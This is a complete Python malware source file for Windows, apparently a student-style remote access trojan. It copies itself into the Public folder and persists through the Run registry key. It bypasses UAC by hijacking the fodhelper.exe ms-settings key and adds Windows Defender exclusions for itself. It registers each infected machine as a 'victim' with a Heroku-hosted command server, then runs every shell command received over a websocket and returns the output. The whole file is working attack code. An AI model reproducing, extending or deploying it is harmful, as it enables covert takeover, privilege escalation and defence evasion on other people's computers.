import os
import re
import sys
import ssl
import json
import uuid
import socket
import winreg
import ctypes
import requests
import websocket
import subprocess
from hashlib import sha256


def add_to_winregistry():
    """
    Python code to add current script to the winregistry.
    """
    address = r'C:\Users\Public\new_virus.exe -s'

    # key we want to change is HKEY_CURRENT_USER
    # key value is Software\Microsoft\Windows\CurrentVersion\Run
    key = winreg.HKEY_CURRENT_USER
    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"

    # open the key to make changes to
    open = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)

    # modifiy the opened key
    winreg.SetValueEx(open, "reverse_shell", 0, winreg.REG_SZ, address)

    # now close the opened key
    winreg.CloseKey(open)


class AdminPrivilegesManager(object):
    """
    This class is responsible for bypassing thr UAC and granting administration permissions to this program.
    """

    def __init__(self):
        self.cmd = r"C:\Users\Public\new_virus.exe -r"  # The command to run with administration permissions.
        self.fod_helper = r'C:\Windows\System32\fodhelper.exe'  # The path to fodhelper.exe.
        self.python_cmd = "python"
        self.reg_path = r'Software\Classes\ms-settings\shell\open\command'  # The registry key to put the command in.
        self.delegate_exec_reg_key = 'DelegateExecute'
        self.old_value = ''  # This will store the value of the operating system's redirection settings.

    def disable_file_system_redirection(self):
        """
        Disable file system redirection.
        """
        self.old_value = ctypes.c_long()
        ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(self.old_value))

    def enable_file_system_redirection(self):
        """
        Enable file system redirection.
        """
        ctypes.windll.kernel32.Wow64RevertWow64FsRedirection(self.old_value)

    def is_running_as_admin(self):
        """
        Checks if the script is running with administrative privileges.
        Returns True if is running as admin, False otherwise.
        """
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def create_reg_key(self, key, value):
        """
        Creates a reg key.
        """
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.reg_path)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
            winreg.CloseKey(registry_key)
        except WindowsError:
            raise

    def bypass_uac(self, cmd):
        """
        Tries to bypass the UAC.
        """
        try:
            self.create_reg_key(self.delegate_exec_reg_key, '')
            self.create_reg_key(None, cmd)
        except WindowsError:
            raise

    def main(self):
        if not self.is_running_as_admin():
            print('[!] The script is NOT running with administrative privileges')
            print('[+] Trying to bypass the UAC')
            try:
                self.disable_file_system_redirection()  # Needed in computers with 32 bit python.
                current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
                cmd = '{} /k {} {}'.format(self.cmd, self.python_cmd, current_dir)
                self.bypass_uac(cmd)
                subprocess.call(self.fod_helper, shell=True)
                print('ran fodhelper.exe')
            except Exception as e:
                print(e)
                sys.exit(1)
        else:
            print('[+] The script is running with administrative privileges!')


class WebClient(object):
    """
    This class is responsible for communicating with the web server.
    """

    def __init__(self, username, password):
        # The username to use when creating/logging in a victim's user.
        self.username = username
        # The password to use when creating/logging in a victim's user.
        # The password is the computer's mac address encrypted as a sha256 hash.
        self.password = sha256(password.encode()).hexdigest()
        self.session = requests.Session()

    def register(self):
        """
        Registers a user according to the victim's details.
        :return: Response from the web server.
        """
        r1 = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/register/')
        csrf = r1.cookies['csrftoken']
        r2 = self.session.post('https://intense-river-70224.herokuapp.com/reverse_shell/register/',
                               data={
                                   'csrfmiddlewaretoken': csrf,
                                   'username': self.username,
                                   'password1': self.password,
                                   'password2': self.password,
                                   'victim': True,
                               })
        return r2

    def login(self):
        """
        Logs the victim's user in using the victim's details.
        :return: Response from the web server.
        """
        session_id = None
        # Validate login first
        r1 = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/validate-login/')
        csrf = r1.cookies['csrftoken']
        r2 = self.session.post('https://intense-river-70224.herokuapp.com/reverse_shell/validate-login/',
                               data={
                                   'csrfmiddlewaretoken': csrf,
                                   'username': self.username,
                                   'password': self.password,
                               })
        if r2.status_code == 200:
            # Do the real login
            r1 = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/login/')
            csrf = r1.cookies['csrftoken']
            r2 = self.session.post('https://intense-river-70224.herokuapp.com/reverse_shell/login/',
                                   data={
                                       'csrfmiddlewaretoken': csrf,
                                       'username': self.username,
                                       'password': self.password,
                                   })
            session_id = self.session.cookies['sessionid']
        return r2, session_id

    def logout(self):
        """
        Logs out the victim's user.
        :return: Response from the web server.
        """
        response = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/logout/')
        return response

    def create_victim(self, computer_name, mac_address):
        """
        Creates a new victim object using the web server's rest api.
        :param computer_name: The computer name.
        :param mac_address: The computer mac address.
        :return: Response from the web server.
        """
        response = self.session.get('https://intense-river-70224.herokuapp.com/api/victims/')
        csrf = response.cookies['csrftoken']

        data = {
            'csrfmiddlewaretoken': csrf,
            'computer_name': computer_name,
            'mac_address': mac_address,
            'logged_in': True,
            'owner': self.username,
        }
        response = self.session.post('https://intense-river-70224.herokuapp.com/api/victims/', data=data)
        return response


class Client(object):
    """
    This class is responsible for the virus's main logic.
    """

    def __init__(self):
        # The computer name.
        self.host_name = socket.gethostname()
        # The computer mac address.
        self.mac_address = self.get_mac_address()
        # The username of the user attached to the victim. A formatted form of the computer's mac address.
        username = self.mac_address.replace(':', '')
        self.api = WebClient(username, password=username)

    @staticmethod
    def get_mac_address():
        """
        Joins elements of getnode() after each 2 digits using winregex expression.
        :return: A formatted version of the computer's mac address.
        """
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))

    def connect_to_web_server(self):
        """
        Tries to log the user in using the victim's details' if fails creates a new user and a new victim object.
        """
        response, self.session_id = self.api.login()
        if response.status_code == 401:
            self.api.register()
            self.api.login()
            self.api.create_victim(self.host_name, self.mac_address)

    @staticmethod
    def execute_command(command):
        """
        Execute a command in the computer's shell.
        :param command: The command to be executed.
        :return: The output and error from returned from the command's execution.
        """
        if command[:2] == 'cd':
            os.chdir(command[3:])
        if len(command) > 0:
            command = subprocess.Popen(
                command[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
            )
            output_bytes = command.stdout.read()
            error_bytes = command.stderr.read()
            output_str = f'{os.getcwd()}$ {str(output_bytes, "utf-8")}{str(error_bytes, "utf-8")}'
            output_str = output_str.replace('\n', '\r\n')
        return output_str

    def main(self):
        """
        The main function. Connects to the web server and create a websocket.
        When receives a message from the websocket, executes the command from the message and sends back the output.
        When an exception occurs, logs the victim out and restarts the function.
        """
        while True:
            try:
                self.connect_to_web_server()
                ws = websocket.create_connection("wss://intense-river-70224.herokuapp.com/ws/reverse_shell/connect/",
                                                 sslopt={"cert_reqs": ssl.CERT_NONE},
                                                 cookie=f'sessionid={self.session_id}')
                while True:
                    data = ws.recv()
                    json_data = json.loads(data)
                    command = json_data['message']
                    output = self.execute_command(command)
                    ws.send(json.dumps({'message': output}))
            except:
                self.api.logout()
                ws.close()


if __name__ == "__main__":
    admin_privileges_manager = AdminPrivilegesManager()
    arg = sys.argv[1]
    if arg == '-i':
        # Install mode
        cmd = r'xcopy /y new_virus.exe "C:\Users\Public\"'
        subprocess.call(cmd, shell=True)
        cmd = r'cd C:\Users\Public'
        subprocess.call(cmd, shell=True)
        add_to_winregistry()
        print('added to registry')
        admin_privileges_manager.main()

    elif arg == '-s':
        # Startup mode
        admin_privileges_manager.main()

    elif arg == '-r':
        # Run mode
        cmd = r'powershell -Command "Add-MpPreference -ExclusionPath $env:Public"'
        subprocess.call(cmd, shell=True)
        cmd = r'powershell -Command "Add-MpPreference -ExclusionProcess new_virus.exe"'
        subprocess.call(cmd, shell=True)
        client = Client()
        client.main()
